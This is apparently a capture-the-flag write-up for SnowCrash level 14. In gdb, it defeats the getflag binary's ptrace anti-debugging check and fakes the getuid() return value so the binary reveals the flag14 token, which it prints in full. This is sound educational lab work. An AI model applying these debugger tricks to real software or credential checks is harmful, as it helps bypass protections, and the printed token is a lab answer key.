# Level14

```bash
level14@SnowCrash:~$ ls -lA
total 12
-r-x------ 1 level14 level14  220 Apr  3  2012 .bash_logout
-r-x------ 1 level14 level14 3518 Aug 30  2015 .bashrc
-r-x------ 1 level14 level14  675 Apr  3  2012 .profile
```

```bash
level14@SnowCrash:~$ which getflag
/bin/getflag
```

```bash
level14@SnowCrash:~$ objdump -d /bin/getflag |  curl -F 'f:1=<-' ix.io
http://ix.io/2aQN
level14@SnowCrash:~$ gdb /bin/getflag
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /bin/getflag...(no debugging symbols found)...done.
(gdb) run
Starting program: /bin/getflag
You should not reverse this
[Inferior 1 (process 2266) exited with code 01]
(gdb)
```

Running `strings` on the program tells us the password are stored in encrypted strings, we can think the program calls getuid() to know which user is running the program and decodes the password of the associated uid.

```bash
level14@SnowCrash:~$ strings /bin/getflag
...
/proc/self/maps
/proc/self/maps is unaccessible, probably a LD_PRELOAD attempt exit..
libc
Check flag.Here is your token :
You are root are you that dumb ?
I`fA>_88eEd:=`85h0D8HE>,D
7`4Ci4=^d=J,?>i;6,7d416,7
<>B16\AD<C6,G_<1>^7ci>l4B
B8b:6,3fj7:,;bh>D@>8i:6@D
?4d@:,C>8C60G>8:h:Gb4?l,A
G8H.6,=4k5J0<cd/D@>>B:>:4
H8B8h_20B4J43><8>\ED<;j@3
78H:J4<4<9i_I4k0J^5>B1j`9
bci`mC{)jxkn<"uD~6%g7FK`7
Dc6m~;}f8Cj#xFkel;#&ycfbK
74H9D^3ed7k05445J0E4e;Da4
70hCi,E44Df[A4B/J@3f<=:`D
8_Dw"4#?+3i]q&;p6 gtw88EC
boe]!ai0FB@.:|L6l@A?>qJ}I
g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|
Nope there is no token here for you sorry. Try again :)
00000000 00:00 0
LD_PRELOAD detected through memory maps exit ..
;*2$"$
...
```

### Exploit

- [Full disassembly](http://ix.io/2aQN)

- Start gdb with getflag

```bash
level14@SnowCrash:~$ gdb /bin/getflag
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /bin/getflag...(no debugging symbols found)...done.
```

- Place a breakpoint for the next ptrace call, checking if the program is running in a debugger

```bash
(gdb) break ptrace
Breakpoint 1 at 0x8048540
```

- Start the program until the breakpoint is reached

```bash
(gdb) run
Starting program: /bin/getflag

Breakpoint 1, 0xb7f146d0 in ptrace () from /lib/i386-linux-gnu/libc.so.6
```

- Step in the ptrace function and step until the end of it

```bash
(gdb) si
0xb7f146d3 in ptrace () from /lib/i386-linux-gnu/libc.so.6

(gdb) s
Single stepping until exit from function ptrace,
which has no line number information.
0x0804898e in main ()
```

- Replace the return of the ptrace function to simulate we're not running this in a debugger

```bash
(gdb) info registers
eax            0xffffffff	-1
ecx            0xb7e2b900	-1209878272
edx            0xffffffc8	-56
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff5f0	0xbffff5f0
ebp            0xbffff718	0xbffff718
esi            0x0	0
edi            0x0	0
eip            0x804898e	0x804898e <main+72>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) set $eax = 0
```

- Place the next breakpoint until the getuid() call, which will verify we're running the program with the `flagXX` user

```bash
(gdb) break getuid
Breakpoint 2 at 0xb7ee4cc0
```

- Continue the execution until the next breakpoint

```bash
(gdb) continue
Continuing.

Breakpoint 2, 0xb7ee4cc0 in getuid () from /lib/i386-linux-gnu/libc.so.6
```

- Step in the getuid() function and step until the end of it

```bash
(gdb) si
0xb7ee4cc5 in getuid () from /lib/i386-linux-gnu/libc.so.6
(gdb) s
Single stepping until exit from function getuid,
which has no line number information.
0x08048b02 in main ()
```

- Replace the return of the getuid() function with the uid of the `flag14` user

```bash
(gdb) info registers
eax            0x7de	2014
ecx            0xb7fda000	-1208115200
edx            0x20	32
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff5f0	0xbffff5f0
ebp            0xbffff718	0xbffff718
esi            0x0	0
edi            0x0	0
eip            0x8048b02	0x8048b02 <main+444>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) set $eax = 3014
```

- Continue the execution of the program

```bash
(gdb) continue
Continuing.
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
[Inferior 1 (process 2168) exited normally]
(gdb)
The program is not being run.
```


### Finish the project !

```bash
level14@SnowCrash:~$ su flag14
Password: <<< '7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ'
Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)

flag14@SnowCrash:~$ getflag
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```
